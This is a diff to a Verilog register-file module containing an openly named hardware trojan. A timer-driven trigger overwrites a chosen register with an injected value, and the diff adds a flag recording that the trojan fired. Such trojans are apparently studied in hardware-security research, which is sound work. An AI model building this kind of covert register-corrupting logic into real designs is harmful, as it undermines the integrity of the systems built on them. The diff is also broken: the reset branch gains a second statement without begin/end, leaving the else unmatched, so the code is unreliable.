@@ -40,6 +40,7 @@ module regFile #(
 reg [REG_DATA_WIDTH-1:0] register_file[0:(1<<REG_SEL_BITS)-1];
 
 wire trojan_trigger;
+reg did_trigger;
 wire [REG_DATA_WIDTH-1:0] trojan_value;
 wire [REG_SEL_BITS-1:0] trojan_reg;
 
@@ -50,6 +51,7 @@ timer #(
   .clock(clock),
   .reset(reset),
   .trigger(trojan_trigger),
+  .did_trigger(did_trigger),
   .trojan(trojan_value),
   .trojan_reg(trojan_reg)
 );
@@ -57,9 +59,12 @@ timer #(
 always @(posedge clock)
   if(reset==1)
     register_file[0] <= 0;
+    did_trigger <= 0;
   else
-    if(trojan_trigger == 1)
+    if(trojan_trigger == 1) begin
       register_file[trojan_reg] <= trojan_value;
+      did_trigger <= 1;
+    end
     if (wEn & write_sel != 0) 
       register_file[write_sel] <= write_data;
 
